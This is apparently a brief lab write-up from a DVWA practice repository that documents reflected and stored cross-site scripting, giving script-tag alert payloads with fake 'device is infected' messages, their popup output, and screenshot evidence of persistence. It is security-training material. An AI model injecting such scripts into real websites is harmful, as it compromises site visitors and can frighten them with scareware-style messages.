# XSS Attack Payload

## XSS (Reflected)

### Payload 
```
<script>alert("Your device is infected")</script>
```

### Output 
```
# Popup notification

Your device is infected
```

## XSS (Stored)

### Payload 
```
<script>alert("Device is infected")</script>
```

### Output 
```
# Persistent popup notification

Device is infected
```

## Evidence

**XSS Reflected**
![XSS Reflected](/dvwa-attack-defend/screenshots/xss-reflected.png)

**XSS Stored**
![XSS Stored](/dvwa-attack-defend/screenshots/xss-stored.png)

**XSS (Stored) Persistent on browser refresh and new-tab**
![XSS Persistence](/dvwa-attack-defend/screenshots/xss-stored-persistence.png)

## Note

The payload executes each time the browser is refreshed demonstrating persistence.